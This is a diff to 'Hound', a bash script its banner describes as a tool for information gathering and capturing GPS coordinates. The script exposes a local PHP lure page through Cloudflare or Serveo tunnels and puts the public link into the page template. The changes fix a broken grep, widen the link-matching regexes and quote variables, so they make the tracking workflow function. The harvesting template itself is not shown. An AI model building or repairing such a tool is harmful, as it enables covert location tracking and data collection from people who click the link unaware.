@@ -8,15 +8,15 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n' 
-printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
-printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
-printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
-printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
-printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                             [...]
-printf " \e[1;93m      Hound Ver 0.3 - by Anil Parashar [TechChip]\e[0m \n"
-printf " \e[1;92m      www.techchip.net | youtube.com/techchipnet \e[0m \n"
-printf " \e[1;92m      tool modify by Lokesh Kumar | I'm not a hater of TechChip \e[0m \n"
+printf '\n      ██  ██  ██████  ██   ██ ███   ██ ██████ \n' 
+printf '      ██  ██ ██   ██ ██   ██ ████  ██ ██  ██ \n'
+printf '      ███████ ██   ██ ██   ██ ██ ██ ██ ██  ██ \n'
+printf '      ██  ██ ██   ██ ██   ██ ██  ██ ██ ██  ██ \n'
+printf '      ██  ██  ██████   ██████  ██  ████ ██████  \n\n'
+printf '\e[1;31m      ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
+printf " \e[1;93m     Hound Ver 0.3 - by Anil Parashar [TechChip]\e[0m \n"
+printf " \e[1;92m     www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1;92m     tool modify by Lokesh Kumar | I'm not a hater of TechChip \e[0m \n"
 printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
 printf "\n"
 }
@@ -77,7 +77,7 @@ else
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
 arch=$(uname -m)
-arch2=$(uname -a |  -o 'Android' | head -n1)
+arch2=$(uname -a |  grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
 elif [[ "$arch" == *'aarch64'* ]]; then
@@ -96,12 +96,14 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm cf.log > /dev/null 2>&1 &
 cloudflared tunnel -url 127.0.0.1:$port --logfile cf.log > /dev/null 2>&1 &
 sleep 10
+# *** FIX APPLIED: Added A-Z to match upper-case characters in the subdomain ***
 link=$(grep -o 'https://[-0-9a-zA-Z]*\.trycloudflare.com' "cf.log")
+# *****************************************************************************
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link" # Double quotes added for safety
 fi
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 checkfound
@@ -122,12 +124,14 @@ sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting Serveo tunnel...\n"
 ssh -R 80:localhost:$port serveo.net > link.log 2>&1 &
 sleep 10
-link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' "link.log")
+# *** FIX APPLIED: Added A-Z to match upper-case characters in the subdomain ***
+link=$(grep -o 'https://[-0-9a-zA-Z]*\.serveo.net' "link.log")
+# *****************************************************************************
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link" # Double quotes added for safety
 fi
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 checkfound
